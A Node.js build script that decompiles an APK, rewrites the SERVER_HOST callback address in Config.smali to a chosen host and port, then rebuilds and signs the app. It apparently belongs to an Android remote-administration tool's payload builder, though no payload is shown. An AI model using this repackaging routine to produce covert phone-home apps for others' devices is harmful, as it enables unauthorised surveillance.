const
    cp = require('child_process'),
    fs = require('fs'),
    path = require('path'),
    config = require('./config');

function escapeRegExp(str) {
    return str.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
}

// Java version check for uber-apk-signer compatibility (Java 8+ supported, Java 17+ recommended)
function javaversion(callback) {
    let spawn = cp.spawn('java', ['-version']);
    let output = "";
    spawn.on('error', (err) => callback("Unable to spawn Java - " + err, null));
    spawn.stderr.on('data', (data) => {
        output += data.toString();
    });
    spawn.on('close', function (code) {
        let javaIndex = output.indexOf('java version');
        let openJDKIndex = output.indexOf('openjdk version');
        let javaVersion = (javaIndex !== -1) ? output.substring(javaIndex, (javaIndex + 27)) : "";
        let openJDKVersion = (openJDKIndex !== -1) ? output.substring(openJDKIndex, (openJDKIndex + 27)) : "";
        if (javaVersion !== "" || openJDKVersion !== "") {
            // Support Java 8, 11, 17, and newer versions for APK building with uber-apk-signer
            const supportedVersions = ["1.8.0", "11", "17", "18", "19", "20", "21"];
            const isSupported = supportedVersions.some(version => 
                javaVersion.includes(version) || openJDKVersion.includes(version)
            );
            
            if (isSupported) {
                // uber-apk-signer is fully compatible with Java 17+, no warnings needed
                console.log(`Java detected: ${javaVersion || openJDKVersion} - Compatible with uber-apk-signer`);
                
                spawn.removeAllListeners();
                spawn.stderr.removeAllListeners();
                return callback(null, (javaVersion || openJDKVersion));
            } else return callback("Wrong Java Version Installed. Detected " + (javaVersion || openJDKVersion) + ". Please use Java 8, 11, 17, or newer", undefined);
        } else return callback("Java Not Installed", undefined);
    });
}

function findConfigSmaliPath() {
    const bases = ['smali'];
    for (let i = 2; i <= 5; i++) bases.push(`smali_classes${i}`);
    for (const base of bases) {
        const p = path.join(config.smaliPath, base, config.smaliClassRelative);
        if (fs.existsSync(p)) {
            try { writeProgress({ step: 'locate', message: 'Config.smali located', complete: true }); } catch (e) {}
            return p;
        }
    }
    return null;
}

function patchAPK(URI, PORT, cb) {
    if (PORT < 25565) {
        // Ensure we have fresh decompiled sources before patching
        decompileRawApk(function (derr) {
            if (derr) return cb(derr);

            const targetSmali = findConfigSmaliPath();
            if (!targetSmali) return cb('Config.smali not found under smali folders');

            try { writeProgress({ step: 'patch', message: 'Patching SERVER_HOST', complete: false }); } catch (e) {}
            fs.readFile(targetSmali, 'utf8', function (err, data) {
                if (err) return cb('File Patch Error - READ');

                const newUrl = `http://${URI}:${PORT}`;

                const fieldInitRegex = /(\.field\s+[^\n]*\bSERVER_HOST:Ljava\/lang\/String;[^\n]*=\s*")(https?:\/\/[^"\r\n]+)(")/;
                const match = data.match(fieldInitRegex);
                if (!match) return cb('Existing SERVER_HOST definition not found in smali');

                const currentUrl = match[2];
                const urlPattern = new RegExp(escapeRegExp(currentUrl), 'g');
                const occurrences = (data.match(urlPattern) || []).length;

                if (!occurrences) return cb('SERVER_HOST URL not detected for replacement');

                if (currentUrl === newUrl) {
                    try { writeProgress({ step: 'patch', message: 'SERVER_HOST already set', complete: true }); } catch (e) {}
                    return cb(false);
                }

                const updated = data.replace(urlPattern, newUrl);

                if (updated === data) {
                    try { writeProgress({ step: 'patch', message: 'SERVER_HOST already set', complete: true }); } catch (e) {}
                    return cb(false);
                }

                fs.writeFile(targetSmali, updated, 'utf8', function (werr) {
                    if (werr) return cb('File Patch Error - WRITE');
                    try { writeProgress({ step: 'patch', message: `Patch applied (${occurrences} occurrence${occurrences === 1 ? '' : 's'})`, complete: true }); } catch (e) {}
                    return cb(false);
                });
            });
        });
    }
}

function cleanDecompiledDir(dirPath) {
    try {
        if (fs.existsSync(dirPath)) {
            fs.rmSync(dirPath, { recursive: true, force: true });
        }
        // ensure the directory exists after cleanup (apktool will create, but be safe)
        fs.mkdirSync(dirPath, { recursive: true });
        try { writeProgress({ step: 'clean', message: 'Decompiled folder cleaned', complete: true }); } catch (e) {}
        return null;
    } catch (e) {
        return e;
    }
}

function decompileRawApk(cb) {
    const err = cleanDecompiledDir(config.smaliPath);
    if (err) return cb('Failed to clean decompiled folder - ' + err.message);

    if (!fs.existsSync(config.rawApkPath)) {
        return cb('Raw APK not found at ' + config.rawApkPath + ' - please place compiled app-debug.apk there.');
    }

    // apktool d "raw.apk" -o "decompiled" -f
    const decompileCmd = `java -jar "${config.apkTool}" d "${config.rawApkPath}" -o "${config.smaliPath}" -f`;
    try { writeProgress({ step: 'decompile', message: 'Decompiling raw APK', complete: false }); } catch (e) {}
    cp.exec(decompileCmd, (error, stdout, stderr) => {
        if (error) return cb('Decompile Command Failed - ' + error.message);
        try { writeProgress({ step: 'decompile', message: 'Decompile completed', complete: true }); } catch (e) {}
        return cb(false);
    });
}

function buildAPK(cb) {
    javaversion(function (err, version) {
        try { writeProgress({ step: 'java', message: err ? String(err) : 'Java detected', complete: !err }); } catch (e) {}
        if (!err) {
            // Build from already decompiled-and-patched folder
            try { writeProgress({ step: 'build', message: 'Building APK', complete: false }); } catch (e) {}
            cp.exec(config.buildCommand, (error, stdout, stderr) => {
                if (error) return cb('Build Command Failed - ' + error.message);
                try { writeProgress({ step: 'build', message: 'Build completed', complete: true }); } catch (e) {}
                // Sign apk
                try { writeProgress({ step: 'sign', message: 'Signing APK', complete: false }); } catch (e) {}
                cp.exec(config.signCommand, (sErr, sOut, sErrOut) => {
                    if (!sErr) {
                        // Copy the signed APK to the download location
                        const downloadApkPath = config.apkBuildPath.replace('build.apk', 'build.s.apk');
                        fs.copyFile(config.apkBuildPath, downloadApkPath, (copyError) => {
                            if (copyError) return cb('Failed to copy signed APK - ' + copyError.message);
                            const cleanupErr = cleanDecompiledDir(config.smaliPath);
                            if (cleanupErr) {
                                try { writeProgress({ step: 'clean', message: 'Cleanup failed - ' + cleanupErr.message, complete: false }); } catch (e) {}
                                return cb('Build succeeded but failed to clean decompiled folder - ' + cleanupErr.message);
                            }
                            try { writeProgress({ step: 'clean', message: 'Decompiled folder cleaned', complete: true }); } catch (e) {}
                            try { writeProgress({ step: 'finalize', message: 'Build succeeded', complete: true }); } catch (e) {}
                            return cb(false);
                        });
                    } else return cb('Sign Command Failed - ' + sErr.message);
                });
            });
        }
        else return cb(err);
    })
}

function writeProgress(data) {
    try {
        const payload = Object.assign({ time: new Date().toISOString() }, data || {});
        fs.writeFileSync(config.buildProgressFile, JSON.stringify(payload));
    } catch (e) {
        // ignore progress write errors
    }
}

module.exports = {
    buildAPK,
    patchAPK
}
